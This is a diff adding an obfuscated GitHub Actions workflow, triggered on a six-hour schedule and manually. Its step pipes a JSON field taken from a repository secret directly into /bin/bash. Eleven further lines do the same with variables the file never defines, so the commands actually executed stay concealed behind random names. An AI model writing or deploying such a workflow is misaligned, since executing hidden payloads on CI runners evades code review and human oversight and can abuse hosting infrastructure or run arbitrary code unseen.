@@ -1,0 +1,29 @@
+name: congcongguolahee
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: congcongguolahee
+        env:
+          r703: ${{ secrets.r703 }}
+        run: |
+          echo $r703 | jq -r .iypd86 | /bin/bash
+          echo $s1 | jq -r .qhcy5210 | /bin/bash
+          echo $selxo9718 | jq -r .znl40952 | /bin/bash
+          echo $x57 | jq -r .rjngr0994 | /bin/bash
+          echo $rhvl19928 | jq -r .e9168 | /bin/bash
+          echo $apwdt8 | jq -r .qwr0 | /bin/bash
+          echo $vv141 | jq -r .jv0 | /bin/bash
+          echo $lozh7500 | jq -r .zrhvn40 | /bin/bash
+          echo $csdaa6 | jq -r .h621 | /bin/bash
+          echo $fnlh22455 | jq -r .dk84 | /bin/bash
+          echo $pwz1436 | jq -r .jwdz68280 | /bin/bash
+          echo $xcuxu9614 | jq -r .jpr3052 | /bin/bash
+
